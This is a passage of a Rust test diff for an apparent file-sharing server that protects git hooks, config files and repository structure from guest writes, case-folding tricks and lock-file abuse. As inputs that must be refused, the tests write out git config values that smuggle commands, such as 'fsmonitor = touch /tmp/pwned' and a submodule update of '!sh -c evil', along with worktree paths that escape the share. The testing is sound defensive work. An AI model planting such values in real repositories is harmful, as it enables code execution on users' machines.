++        self.fs().notices().drain()
++    }
++
++    /// Copies a host tree into the share through the server (directories made, files written).
++    fn copy_in(&mut self, from: &Path, to: &str) {
++        let mut entries: Vec<_> = fs::read_dir(from).unwrap().map(|e| e.unwrap().path()).collect();
++        entries.sort();
++        for path in entries {
++            let name = path.file_name().unwrap().to_str().unwrap();
++            let target = format!("{to}/{name}");
++            if path.is_dir() {
++                let e = self.md(&target);
++                assert!(e == 0 || e == lx::EEXIST, "mkdir {target}: {e}");
++                self.copy_in(&path, &target);
++            } else {
++                assert_eq!(self.put(&target, &fs::read(&path).unwrap()), 0, "{target}");
++            }
++        }
++    }
++}
++
++/// Every case spelling of a short name, or the obvious ones and each single-letter flip of a longer one.
++fn spellings(name: &str) -> Vec<String> {
++    let letters: Vec<usize> = name.char_indices().filter(|(_, c)| c.is_ascii_alphabetic()).map(|(i, _)| i).collect();
++    let mut out = Vec::new();
++    if letters.len() <= 7 {
++        for mask in 0u32..(1 << letters.len()) {
++            let mut s: Vec<u8> = name.as_bytes().to_vec();
++            for (bit, i) in letters.iter().enumerate() {
++                if mask & (1 << bit) != 0 {
++                    s[*i] = s[*i].to_ascii_uppercase();
++                } else {
++                    s[*i] = s[*i].to_ascii_lowercase();
++                }
++            }
++            out.push(String::from_utf8(s).unwrap());
++        }
++    } else {
++        out.push(name.to_ascii_lowercase());
++        out.push(name.to_ascii_uppercase());
++        for i in &letters {
++            let mut s = name.to_ascii_lowercase().into_bytes();
++            s[*i] = s[*i].to_ascii_uppercase();
++            out.push(String::from_utf8(s).unwrap());
++        }
++    }
++    out
++}
++
++fn tag_of(path: &Path) -> Option<String> {
++    let c = CString::new(path.as_os_str().as_bytes()).unwrap();
++    let mut buf = [0u8; 256];
++    let n = unsafe { libc::getxattr(c.as_ptr(), QUARANTINE_NAME.as_ptr(), buf.as_mut_ptr().cast(), buf.len(), 0, libc::XATTR_NOFOLLOW) };
++    (n >= 0).then(|| String::from_utf8_lossy(&buf[..n as usize]).into_owned())
++}
++
++fn assert_tagged(path: &Path) {
++    let value = tag_of(path).unwrap_or_else(|| panic!("{} carries no quarantine tag", path.display()));
++    let parts: Vec<&str> = value.split(';').collect();
++    assert_eq!(parts.len(), 4, "{value}");
++    assert_eq!(parts[0], "0081");
++    assert!(parts[1].len() == 8 && parts[1].chars().all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()), "{value}");
++    assert_eq!((parts[2], parts[3]), ("Winter Cowork", ""));
++}
++
++/// The host's git, isolated: no system or global config, an empty template directory, a scratch home.
++fn host_git(home: &Path, dir: &Path, args: &[&str]) -> Output {
++    let template = home.join("template");
++    let _ = fs::create_dir(&template);
++    let out = Command::new("git")
++        .current_dir(dir)
++        .env_clear()
++        .env("PATH", std::env::var_os("PATH").unwrap_or_default())
++        .env("HOME", home)
++        .env("GIT_CONFIG_NOSYSTEM", "1")
++        .env("GIT_CONFIG_GLOBAL", "/dev/null")
++        .env("GIT_TERMINAL_PROMPT", "0")
++        .args(["-c", &format!("init.templateDir={}", template.display()), "-c", "init.defaultBranch=main", "-c", "user.name=t", "-c", "user.email=t"])
++        .args(["-c", "protocol.file.allow=always", "-c", "core.hooksPath=/dev/null"])
++        .args(args)
++        .output()
++        .expect("the host has git");
++    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
++    out
++}
++
++fn text(out: &Output) -> String {
++    String::from_utf8_lossy(&out.stdout).trim().to_owned()
++}
++
++// ---- H1: how protected names match ---------------------------------------------------------------------
++
++#[test]
++fn r15_fold_matches_the_volume_folding_and_exact_on_a_case_sensitive_volume() {
++    for (name, folded) in [
++        ("HOOKS", "hooks"),
++        ("Hoo\u{212A}s", "hooks"),
++        ("Hook\u{017F}", "hooks"),
++        ("CONFIG", "config"),
++        ("con\u{FB01}g", "config"),
++        (".GiT", ".git"),
++        ("HEAD", "head"),
++        ("CommonDir", "commondir"),
++    ] {
++        assert_eq!(fold(name.as_bytes()), folded, "{name}");
++    }
++    // A non-ASCII letter that does not fold to ASCII never matches an ASCII name.
++    assert_ne!(fold("h\u{00F6}oks".as_bytes()), "hooks");
++    let folding = git::GitState::new(false);
++    assert!(folding.is(b"HOOKS", "hooks") && folding.is("hoo\u{212A}s".as_bytes(), "hooks") && folding.is(b"head", "HEAD"));
++    let sensitive = git::GitState::new(true);
++    assert!(sensitive.is(b"hooks", "hooks") && !sensitive.is(b"HOOKS", "hooks") && !sensitive.is(b"head", "HEAD"));
++    // The volume decides: the device asks `_PC_CASE_SENSITIVE` of the share root.
++    let share = folder(|_| {});
++    let fd = fs::File::open(&share.root).unwrap();
++    let volume = unsafe { libc::fpathconf(fd.as_raw_fd(), libc::_PC_CASE_SENSITIVE) } == 1;
++    assert_eq!(!insensitive(&share), volume);
++}
++
++#[test]
++fn r15_every_case_spelling_of_every_protected_name_is_protected() {
++    let mut share = folder(|root| plant_repo(&root.join("r"), PLAIN_CONFIG));
++    if !insensitive(&share) {
++        // A case-sensitive volume compares exactly; only the exact spellings are protected names.
++        return;
++    }
++    let git = share.at("r/.git");
++    for spelling in spellings("hooks") {
++        assert_eq!(share.mkdir(git, spelling.as_bytes(), 0o755).error, EPERM, "{spelling}");
++        assert_eq!(share.create(git, spelling.as_bytes(), 0o644, RDWR).error, EPERM, "{spelling}");
++        assert_eq!(share.symlink(git, spelling.as_bytes(), b"elsewhere").error, EPERM, "{spelling}");
++    }
++    for name in ["config", "config.worktree"] {
++        for spelling in spellings(name) {
++            assert_eq!(share.create(git, spelling.as_bytes(), 0o644, RDWR).error, EPERM, "{spelling}");
++            // config.lock under any spelling is a plain file; the rename onto any spelling is checked.
++            assert_eq!(share.put(&format!("r/.git/{spelling}.lock"), b"[core]\n\tfsmonitor = x\n"), 0);
++            assert_eq!(share.ren(&format!("r/.git/{spelling}.lock"), &format!("r/.git/{spelling}")), EPERM, "{spelling}");
++            assert_eq!(share.rm(&format!("r/.git/{spelling}.lock")), 0);
++        }
++    }
++    // The Kelvin sign and the long s fold onto ASCII letters.
++    for alias in ["hoo\u{212A}s", "hook\u{017F}"] {
++        assert_eq!(share.mkdir(git, alias.as_bytes(), 0o755).error, EPERM, "{alias}");
++    }
++    assert_eq!(share.create(git, "con\u{FB01}g".as_bytes(), 0o644, RDWR).error, EPERM);
++    let plain = share.at("r");
++    for spelling in spellings("HEAD").into_iter().chain(spellings("commondir")).chain(spellings("gitdir")) {
++        assert_eq!(share.create(plain, spelling.as_bytes(), 0o644, RDWR).error, EPERM, "{spelling}");
++    }
++    for spelling in spellings(".git") {
++        assert_eq!(share.symlink(plain, spelling.as_bytes(), b"x").error, EPERM, "{spelling}");
++        assert_eq!(share.rename(plain, b".git", plain, format!("{spelling}x").as_bytes()).error, EPERM, "{spelling}");
++    }
++    // An ignorable code point inside a protected name is R1's EINVAL on every device.
++    for name in [".g\u{200C}it", "ho\u{200D}oks", "con\u{FEFF}fig", "HE\u{202A}AD"] {
++        assert_eq!(share.mkdir(git, name.as_bytes(), 0o755).error, lx::EINVAL, "{name}");
++        assert_eq!(share.create(plain, name.as_bytes(), 0o644, RDWR).error, lx::EINVAL, "{name}");
++    }
++    // A second spelling of an existing protected node is the same node, held by (dev, ino).
++    fs::create_dir(share.root.join("r/.git/hooks")).unwrap();
++    fs::write(share.root.join("r/.git/hooks/pre-commit"), b"#!/bin/sh\n").unwrap();
++    let hooks = share.at("r/.git/HOOKS");
++    let file = share.node(hooks, b"PRE-COMMIT");
++    assert_eq!(share.open(file, WRONLY).error, EPERM);
++    assert!(!share.notices().is_empty());
++}
++
++// ---- H2: git directories are recognised anywhere, none new outside a .git chain ------------------------
++
++#[test]
++fn r15_bare_shaped_directories_outside_a_dot_git_chain_are_refused() {
++    let mut share = folder(|root| {
++        fs::create_dir_all(root.join("a/b")).unwrap();
++        fs::create_dir(root.join("a/withrefs")).unwrap();
++        fs::create_dir(root.join("a/withrefs/refs")).unwrap();
++        fs::create_dir(root.join("a/withobjects")).unwrap();
++        fs::create_dir(root.join("a/withobjects/objects")).unwrap();
++        // The user's own bare repository.
++        fs::create_dir_all(root.join("bare.git/objects")).unwrap();
++        fs::create_dir(root.join("bare.git/refs")).unwrap();
++        fs::write(root.join("bare.git/HEAD"), "ref: refs/heads/main\n").unwrap();
++        fs::write(root.join("bare.git/config"), "[core]\n\tbare = true\n").unwrap();
++        fs::write(root.join("a/file"), b"x").unwrap();
++    });
++    for name in ["HEAD", "commondir", "gitdir"] {
++        assert_eq!(share.put(&format!("a/b/{name}"), b"ref: refs/heads/main\n"), EPERM, "{name}");
++        assert!(!share.root.join("a/b").join(name).exists());
++    }
++    assert_eq!(share.ren("a/file", "a/b/HEAD"), EPERM);
++    assert_eq!(share.hard("a/file", "a/b/HEAD"), EPERM);
++    assert_eq!(share.sym("a/b/HEAD", "x"), EPERM);
++    assert_eq!(share.md("a/withrefs/objects"), EPERM);
++    assert_eq!(share.md("a/withobjects/refs"), EPERM);
++    // A bare repository planted by the user is a git directory: its hooks and config are protected,
++    // and it cannot be moved.
++    assert_eq!(share.md("bare.git/hooks"), EPERM);
++    assert_eq!(share.put("bare.git/config", b""), EPERM);
++    assert_eq!(share.lock_rename("bare.git/config", b"[core]\n\tfsmonitor = x\n"), EPERM);
++    assert_eq!(share.ren("bare.git", "moved"), EPERM);
++    // Inside a .git chain the same names are git's own work.
++    assert_eq!(share.md("a/b/.git"), 0);
++    assert_eq!(share.md("a/b/.git/refs"), 0);
++    assert_eq!(share.md("a/b/.git/objects"), 0);
++    assert_eq!(share.put("a/b/.git/HEAD", b"ref: refs/heads/main\n"), 0);
++    assert_eq!(share.notices(), vec![NoticeKind::GitProtected]);
++}
++
++// ---- H4: git directories cannot be moved, faked or filled ----------------------------------------------
++
++#[test]
++fn r15_git_directories_cannot_be_moved_removed_or_rebuilt() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::create_dir_all(root.join("evil/hooks")).unwrap();
++        fs::write(root.join("evil/hooks/pre-commit"), b"#!/bin/sh\n").unwrap();
++        fs::write(root.join("evil/config"), b"[core]\n\tfsmonitor = x\n").unwrap();
++        fs::create_dir(root.join("empty")).unwrap();
++        fs::create_dir(root.join("spare")).unwrap();
++        fs::write(root.join("lockfile"), b"x").unwrap();
++    });
++    assert_eq!(share.ren("r/.git", "r/aside"), EPERM);
++    assert_eq!(share.exchange("r/.git", "empty"), EPERM);
++    assert_eq!(share.ren("empty", "r/.git"), EPERM);
++    // .git renamed aside is refused, so is building a new one by renaming a directory onto the name.
++    assert_eq!(share.ren("evil", "spare/.git"), EPERM);
++    assert_eq!(share.md("spare/.git"), 0);
++    assert_eq!(share.rd("spare/.git"), EPERM);
++    // A directory renamed into the zone (H4/H5): a hooks tree or a whole modules/<name>.
++    assert_eq!(share.md("r/.git/modules"), 0);
++    assert_eq!(share.ren("evil", "r/.git/modules/evil"), EPERM);
++    assert_eq!(share.ren("evil/hooks", "r/.git/hooks"), EPERM);
++    assert_eq!(share.ren("empty", "r/.git/modules/empty"), EPERM);
++    // Files move in (git's own lock files do).
++    assert_eq!(share.ren("lockfile", "r/.git/modules/lockfile"), 0);
++    assert!(share.root.join("r/.git/config").exists() && share.root.join("evil/hooks/pre-commit").exists());
++    assert!(!share.root.join("r/.git/hooks").exists() && !share.root.join("r/.git/modules/evil").exists());
++}
++
++// ---- hooks and config at every depth of the zone, and the refs/ and logs/ exemption ----------------
++
++#[test]
++fn r15_config_config_worktree_and_hooks_at_every_depth_below_dot_git() {
++    let mut share = folder(|root| plant_repo(&root.join("r"), PLAIN_CONFIG));
++    for dir in ["r/.git", "r/.git/modules", "r/.git/modules/a", "r/.git/modules/a/b", "r/.git/modules/a/b/c", "r/.git/worktrees", "r/.git/worktrees/w", "r/.git/x", "r/.git/x/y"] {
++        let e = share.md(dir);
++        assert!(e == 0 || e == lx::EEXIST, "{dir}");
++    }
++    for dir in ["r/.git", "r/.git/modules/a", "r/.git/modules/a/b/c", "r/.git/worktrees/w", "r/.git/x/y"] {
++        for name in ["config", "config.worktree"] {
++            assert_eq!(share.put(&format!("{dir}/{name}"), b""), EPERM, "{dir}/{name}");
++            assert_eq!(share.lock_rename(&format!("{dir}/{name}"), b"[core]\n\tworktree = /\n\tfsmonitor = x\n"), EPERM, "{dir}/{name}");
++        }
++        assert_eq!(share.md(&format!("{dir}/hooks")), EPERM, "{dir}/hooks");
++        assert_eq!(share.put(&format!("{dir}/hooks"), b""), EPERM, "{dir}/hooks");
++        assert_eq!(share.sym(&format!("{dir}/hooks"), "x"), EPERM, "{dir}/hooks");
++        // An admitted config may appear at any depth, through the lock.
++        assert_eq!(share.lock_rename(&format!("{dir}/config"), PLAIN_CONFIG.as_bytes()), 0, "{dir}/config");
++    }
++    // A branch and a reflog named config and hooks: git's own refs/ and logs/ are exempt.
++    for path in ["r/.git/refs/heads/config", "r/.git/refs/heads/hooks", "r/.git/refs/tags/config"] {
++        assert_eq!(share.lock_rename(path, b"0123456789012345678901234567890123456789\n"), 0, "{path}");
++    }
++    for dir in ["r/.git/logs", "r/.git/logs/refs", "r/.git/logs/refs/heads"] {
++        assert_eq!(share.md(dir), 0, "{dir}");
++    }
++    assert_eq!(share.put("r/.git/logs/HEAD", b"entry\n"), 0);
++    assert_eq!(share.put("r/.git/logs/refs/heads/config", b"entry\n"), 0);
++    assert_eq!(share.put("r/.git/logs/refs/heads/hooks", b"entry\n"), 0);
++    assert_eq!(share.md("r/.git/refs/heads/feature"), 0);
++    assert_eq!(share.lock_rename("r/.git/refs/heads/feature/hooks", b"0\n"), 0);
++    // ... but never a .git, commondir or gitdir in them.
++    for name in [".git", "commondir", "gitdir"] {
++        assert_eq!(share.put(&format!("r/.git/refs/heads/{name}"), b"x\n"), EPERM, "{name}");
++        assert_eq!(share.put(&format!("r/.git/logs/{name}"), b"x\n"), EPERM, "{name}");
++    }
++    assert_eq!(share.md("r/.git/refs/.git"), EPERM);
++}
++
++#[test]
++fn r15_hooks_are_immutable_in_any_entry_type() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::create_dir_all(root.join("r/.git/hooks/sub")).unwrap();
++        fs::write(root.join("r/.git/hooks/pre-commit.sample"), b"#!/bin/sh\n").unwrap();
++        plant_repo(&root.join("f"), PLAIN_CONFIG);
++        fs::write(root.join("f/.git/hooks"), b"a hooks file").unwrap();
++        plant_repo(&root.join("l"), PLAIN_CONFIG);
++        symlink("/elsewhere", root.join("l/.git/hooks")).unwrap();
++        fs::write(root.join("x"), b"payload").unwrap();
++    });
++    // Below an existing hooks directory: every mutating opcode.
++    assert_eq!(share.put("r/.git/hooks/pre-commit", b"#!/bin/sh\n"), EPERM);
++    assert_eq!(share.md("r/.git/hooks/d"), EPERM);
++    assert_eq!(share.sym("r/.git/hooks/pre-push", "/bin/sh"), EPERM);
++    assert_eq!(share.hard("x", "r/.git/hooks/pre-push"), EPERM);
++    assert_eq!(share.rm("r/.git/hooks/pre-commit.sample"), EPERM);
++    assert_eq!(share.rd("r/.git/hooks/sub"), EPERM);
++    assert_eq!(share.ren("x", "r/.git/hooks/pre-commit"), EPERM);
++    assert_eq!(share.ren("r/.git/hooks/pre-commit.sample", "out"), EPERM);
++    assert_eq!(share.ren("r/.git/hooks/pre-commit.sample", "r/.git/hooks/pre-commit"), EPERM);
++    let sample = share.at("r/.git/hooks/pre-commit.sample");
++    assert_eq!(share.setattr(sample, FATTR_MODE, 0o755, 0).error, EPERM);
++    assert_eq!(share.setattr(sample, FATTR_SIZE, 0, 0).error, EPERM);
++    assert_eq!(share.open(sample, WRONLY).error, EPERM);
++    assert_eq!(share.open(sample, RDWR | TRUNC).error, EPERM);
++    let read = share.open_ok(sample, RDONLY);
++    assert_eq!(share.read(sample, read, 0, 64).body, b"#!/bin/sh\n");
++    let body = FallocateIn { fh: read, offset: 0, length: 4096, mode: 0, padding: 0 };
++    assert_eq!(share.call(Opcode::Fallocate, sample, body.as_slice()).error, EPERM);
++    assert_eq!(share.write(sample, read, 0, b"x").error, EPERM);
++    // The hooks entry itself, of any type: never removed, renamed or replaced.
++    assert_eq!(share.rd("r/.git/hooks"), EPERM);
++    assert_eq!(share.ren("r/.git/hooks", "r/.git/old"), EPERM);
++    assert_eq!(share.rm("f/.git/hooks"), EPERM);
++    assert_eq!(share.open_w("f/.git/hooks"), EPERM);
++    assert_eq!(share.rm("l/.git/hooks"), EPERM);
++    assert_eq!(share.ren("l/.git/hooks", "l/.git/old"), EPERM);
++    assert_eq!(share.ren("x", "f/.git/hooks"), EPERM);
++    assert_eq!(fs::read(share.root.join("r/.git/hooks/pre-commit.sample")).unwrap(), b"#!/bin/sh\n");
++    assert!(!share.root.join("r/.git/hooks/pre-commit").exists());
++    // A commondir naming a git directory that holds hooks is refused (H5 re-validation): the Mac's own
++    // repositories, which carry hooks/*.sample, take no guest-made worktree.
++    assert_eq!(share.md("r/.git/worktrees"), 0);
++    assert_eq!(share.md("r/.git/worktrees/w"), 0);
++    assert_eq!(share.put("r/.git/worktrees/w/commondir", b"../..\n"), EPERM);
++    assert_eq!(fs::read(share.root.join("r/.git/worktrees/w/commondir")).unwrap(), b"");
++}
++
++// ---- config: only through the checked lock and rename (M-a) --------------------------------------------
++
++#[test]
++fn r15_config_changes_only_through_the_checked_lock_rename() {
++    let user = "[core]\n\trepositoryformatversion = 0\n\tbare = false\n\teditor = vim\n[alias]\n\tst = status\n";
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), user);
++        fs::write(root.join("r/.git/config.worktree"), b"[core]\n\tsparsecheckout = true\n").unwrap();
++        fs::write(root.join("r/other.lock"), b"[core]\n\tbare = false\n").unwrap();
++    });
++    // Never created, opened for writing, truncated, linked, renamed away or (config) unlinked.
++    let config = share.at("r/.git/config");
++    assert_eq!(share.open(config, WRONLY).error, EPERM);
++    assert_eq!(share.open(config, RDWR | TRUNC).error, EPERM);
++    assert_eq!(share.setattr(config, FATTR_SIZE, 0, 0).error, EPERM);
++    assert_eq!(share.ren("r/.git/config", "r/.git/config.old"), EPERM);
++    assert_eq!(share.hard("r/.git/config", "r/linked"), EPERM);
++    assert_eq!(share.rm("r/.git/config"), EPERM);
++    assert_eq!(share.put("r/.git/config", b""), EPERM);
++    assert_eq!(fs::read_to_string(share.root.join("r/.git/config")).unwrap(), user);
++    // The user's own risky keys stay, unchanged; an admitted key may be added beside them.
++    let added = format!("{user}[remote \"origin\"]\n\turl = https://example.invalid/r.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n");
++    assert_eq!(share.lock_rename("r/.git/config", added.as_bytes()), 0);
++    assert_eq!(fs::read_to_string(share.root.join("r/.git/config")).unwrap(), added);
++    // Changing a risky value, or adding one, is refused; removing one is allowed.
++    assert_eq!(share.lock_rename("r/.git/config", added.replace("vim", "evil").as_bytes()), EPERM);
++    assert_eq!(share.lock_rename("r/.git/config", format!("{added}[core]\n\tfsmonitor = /tmp/x\n").as_bytes()), EPERM);
++    let removed = added.replace("\teditor = vim\n", "");
++    assert_eq!(share.lock_rename("r/.git/config", removed.as_bytes()), 0);
++    assert_eq!(share.lock_rename("r/.git/config", added.as_bytes()), EPERM, "a removed risky key cannot come back");
++    // The source is git's own `<name>.lock` in the same directory, a single-link regular file.
++    assert_eq!(share.ren("r/other.lock", "r/.git/config"), EPERM);
++    assert_eq!(share.put("r/config.lock", removed.as_bytes()), 0);
++    assert_eq!(share.ren("r/config.lock", "r/.git/config"), EPERM, "a lock from another directory");
++    assert_eq!(share.rm("r/config.lock"), 0);
++    assert_eq!(share.put("r/.git/notalock", removed.as_bytes()), 0);
++    assert_eq!(share.ren("r/.git/notalock", "r/.git/config"), EPERM);
++    // No link is made in the zone; one planted on the Mac is never a lock either.
++    assert_eq!(share.sym("r/.git/config.lock", "other.lock"), EPERM);
++    symlink("../other.lock", share.root.join("r/.git/config.lock")).unwrap();
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), EPERM, "a symlinked lock");
++    assert_eq!(share.rm("r/.git/config.lock"), 0);
++    // A hard-linked lock file (st_nlink > 1).
++    assert_eq!(share.put("r/.git/config.lock", removed.as_bytes()), 0);
++    assert_eq!(share.hard("r/.git/config.lock", "r/kept"), 0);
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), EPERM);
++    assert_eq!(share.rm("r/kept"), 0);
++    // An open writable handle on the lock: the rename is refused until it is released.
++    let lock = share.at("r/.git/config.lock");
++    let fh = share.open_ok(lock, RDWR);
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), EPERM);
++    assert_eq!(share.write(lock, fh, 0, b"[core]\n\tfsmonitor = x\n").error, 0);
++    share.release(lock, fh);
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), EPERM, "the late write is checked too");
++    assert_eq!(share.rewrite("r/.git/config.lock", removed.as_bytes()), 0);
++    let read = share.open_ok(lock, RDONLY);
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), 0);
++    // After the rename the inode is the config: a handle kept from before writes nothing, no new write
++    // open succeeds.
++    assert_eq!(share.write(lock, read, 0, b"[core]\n\tfsmonitor = x\n").error, EPERM);
++    assert_eq!(share.open(lock, WRONLY).error, EPERM);
++    share.release(lock, read);
++    // config.worktree may be unlinked (git does), and only lock-renamed back.
++    assert_eq!(share.ren("r/.git/config.worktree", "r/.git/cw"), EPERM);
++    assert_eq!(share.rm("r/.git/config.worktree"), 0);
++    assert_eq!(share.put("r/.git/config.worktree", b""), EPERM);
++    assert_eq!(share.lock_rename("r/.git/config.worktree", b"[core]\n\tsparsecheckout = true\n"), 0);
++    // An exchange is never the lock path.
++    assert_eq!(share.put("r/.git/swap", b""), 0);
++    assert_eq!(share.exchange("r/.git/swap", "r/.git/config"), EPERM);
++    // More than 1 MiB, or a lock that is not a regular file (a FIFO planted on the host), is refused.
++    let mut big = removed.clone().into_bytes();
++    big.extend(std::iter::repeat_n(b"# padding\n".as_slice(), (1 << 20) / 10 + 1).flatten());
++    assert_eq!(share.put("r/.git/config.lock", b""), 0);
++    let lock = share.at("r/.git/config.lock");
++    let fh = share.open_ok(lock, WRONLY);
++    for (i, chunk) in big.chunks(1 << 19).enumerate() {
++        assert_eq!(share.write(lock, fh, (i << 19) as u64, chunk).error, 0);
++    }
++    share.release(lock, fh);
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), EPERM);
++    assert_eq!(share.rm("r/.git/config.lock"), 0);
++    mkfifo(&share.root.join("r/.git/config.lock"));
++    assert_eq!(share.ren("r/.git/config.lock", "r/.git/config"), EPERM);
++    assert_eq!(share.rm("r/.git/config.lock"), 0);
++    // A config the parser refuses is refused.
++    assert_eq!(share.lock_rename("r/.git/config", b"[core\n"), EPERM);
++    assert_eq!(share.lock_rename("r/.git/config", b"[core]\n\tbare = \"unterminated\n"), EPERM);
++    assert_eq!(share.notices(), vec![NoticeKind::GitProtected]);
++}
++
++fn config_for(key: &str, value: &str) -> String {
++    let parts: Vec<&str> = key.split('.').collect();
++    match parts.as_slice() {
++        [section, name] => format!("[{section}]\n\t{name} = {value}\n"),
++        [section, middle @ .., name] => format!("[{section} \"{}\"]\n\t{name} = {value}\n", middle.join(".")),
++        _ => unreachable!(),
++    }
++}
++
++#[test]
++fn r15_every_allowlist_entry_is_admitted_every_named_refusal_and_suffix_refused() {
++    let mut share = folder(|root| plant_repo(&root.join("r"), ""));
++    let mut ok = |_: &[u8]| false;
++    for key in ADMITTED {
++        let key = key.replace('*', "x");
++        let value = if key == "submodule.x.update" { "checkout" } else { "v" };
++        assert_eq!(share.lock_rename("r/.git/config", config_for(&key, value).as_bytes()), 0, "{key}");
++        assert_eq!(share.lock_rename("r/.git/config", b""), 0);
++    }
++    for value in ["checkout", "rebase", "merge", "none"] {
++        assert_eq!(share.lock_rename("r/.git/config", config_for("submodule.x.update", value).as_bytes()), 0, "{value}");
++        assert_eq!(share.lock_rename("r/.git/config", b""), 0);
++    }
++    for key in ["lfs.url", "lfs.x.access", "lfs.concurrenttransfers", "pull.rebase", "pull.ff", "pull.x.y"] {
++        assert_eq!(share.lock_rename("r/.git/config", config_for(key, "v").as_bytes()), 0, "{key}");
++        assert_eq!(share.lock_rename("r/.git/config", b""), 0);
++    }
++    for key in NAMED_REFUSALS {
++        let value = if key == "submodule.x.update" { "!sh -c evil" } else { "v" };
++        assert_eq!(share.lock_rename("r/.git/config", config_for(key, value).as_bytes()), EPERM, "{key}");
++        let entry = &parse_git_config(config_for(key, value).as_bytes()).unwrap()[0];
++        assert!(!admitted(entry, &mut ok), "{key}");
++    }
++    for key in ["lfs.customtransfer.x.path", "lfs.customtransfer.x.args", "lfs.extension.x.clean", "lfs.extension.x.priority", "submodule.x.update", "core.hookspath"] {
++        assert_eq!(share.lock_rename("r/.git/config", config_for(key, "rebase2").as_bytes()), EPERM, "{key}");
++    }
++    // The suffix backstop refuses even what a wildcard admits.
++    for suffix in REFUSED_SUFFIXES {
++        for key in [format!("lfs.x{suffix}"), format!("pull.x{suffix}"), format!("lfs.x.y{}", suffix.to_ascii_uppercase())] {
++            assert_eq!(share.lock_rename("r/.git/config", config_for(&key, "v").as_bytes()), EPERM, "{key}");
++        }
++    }
++    assert!(!share.root.join("r/.git/config.lock").exists());
++}
++
++#[test]
++fn r15_no_allowlist_entry_matches_the_suffix_rule() {
++    for key in ADMITTED {
++        let last = key.rsplit('.').next().unwrap();
++        assert!(!gitconfig::suffix_refused(last), "{key}");
++    }
++    assert!(!gitconfig::suffix_refused("worktree"), "core.worktree");
++    assert_eq!(ADMITTED_SECTIONS, ["lfs", "pull"]);
++    for suffix in REFUSED_SUFFIXES {
++        assert!(gitconfig::suffix_refused(&format!("x{}", suffix.to_ascii_uppercase())));
++    }
++}
++
++#[test]
++fn r15_the_config_parser_is_strict() {
++    let good = b"\xef\xbb\xbf# comment\n; comment\n[core]\n\tbare = false ; trailing\n\tfilemode\n[remote \"o \\\"x\\\\\"] url = \"a b\"  \n\tfetch = +refs/*:refs/* \\\n  continued\n[Branch.Main]\n\tREMOTE = origin\n[a] k = \"#\\t\\n\\b\"\n";
++    let entries = parse_git_config(good).unwrap();
++    let names: Vec<String> = entries.iter().map(|e| e.name()).collect();
++    assert_eq!(names, ["core.bare", "core.filemode", "remote.o \"x\\.url", "remote.o \"x\\.fetch", "branch.main.remote", "a.k"]);
++    assert_eq!(entries[0].value.as_deref(), Some(&b"false"[..]));
++    assert_eq!(entries[1].value, None);
++    assert_eq!(entries[2].value.as_deref(), Some(&b"a b"[..]));
++    // git keeps the blanks around a continuation: one before the backslash, two after the newline.
++    assert_eq!(entries[3].value.as_deref(), Some(&b"+refs/*:refs/*   continued"[..]));
++    assert_eq!(entries[5].value.as_deref(), Some(&b"#\t\n\x08"[..]));
++    for bad in [
++        &b"key = v\n"[..],
++        b"[core\n",
++        b"[]\n",
++        b"[co re]\n",
++        b"[a.b \"c\"]\n",
++        b"[a \"b\n\"]\n",
++        b"[a \"b\"x]\n",
++        b"[core]\n\tbare = \"x\n",
++        b"[core]\n\tbare = \\q\n",
++        b"[core]\n\tba_re = 1\n",
++        b"[core]\n\t1bare = 1\n",
++        b"[core]\n\tbare = x\0\n",
++        b"[core]\n\t= x\n",
++        b"[core]\n\tbare x\n",
++    ] {
++        assert!(parse_git_config(bad).is_err(), "{:?}", String::from_utf8_lossy(bad));
++    }
++}
++
++#[test]
++fn r15_core_worktree_only_in_a_submodule_git_directory_naming_its_work_tree() {
++    let mut share = folder(|root| {
++        plant_repo(&root.join("sup"), PLAIN_CONFIG);
++        fs::create_dir_all(root.join("sup/.git/modules/sub")).unwrap();
++        fs::create_dir_all(root.join("sup/.git/modules/a/b")).unwrap();
++        fs::create_dir(root.join("sup/sub")).unwrap();
++    });
++    let with = |wt: &str| format!("{PLAIN_CONFIG}\tworktree = {wt}\n");
++    assert_eq!(share.lock_rename("sup/.git/config", with("..").as_bytes()), EPERM, "not a submodule's git directory");
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("/abs").as_bytes()), EPERM);
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("~/x").as_bytes()), EPERM);
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("/../../../sub").as_bytes()), EPERM, "absolute");
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("../../../../..").as_bytes()), EPERM, "leaves the share");
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("../../../.git").as_bytes()), EPERM, "into a .git");
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("..").as_bytes()), EPERM, "into a .git");
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", format!("{}\tfsmonitor = x\n", with("../../../sub")).as_bytes()), EPERM);
++    assert_eq!(share.lock_rename("sup/.git/modules/sub/config", with("../../../sub").as_bytes()), 0);
++    assert_eq!(share.lock_rename("sup/.git/modules/a/b/config", with("../../../../a/b").as_bytes()), 0, "a nested submodule name");
++}
++
++// ---- H5: creation order (T17c), the reviewer's probe step by step ---------------------------------------
++
++#[test]
++fn r15_creation_order_probe_t17c_step_by_step() {
++    let evil = "[core]\n\trepositoryformatversion = 0\n\tworktree = ../../../sub\n\tfsmonitor = touch /tmp/pwned\n";
++    let mut share = folder(|root| {
++        plant_repo(&root.join("r"), PLAIN_CONFIG);
++        fs::create_dir(root.join("r/sub")).unwrap();
++        fs::create_dir(root.join("r/sub2")).unwrap();
++        fs::create_dir(root.join("r/sub3")).unwrap();
++        // The user's own tree: a pre-planted hooks entry and a non-admitted config.
++        fs::create_dir_all(root.join("r/.git/modules/own/hooks")).unwrap();
++        fs::write(root.join("r/.git/modules/own/config"), evil).unwrap();
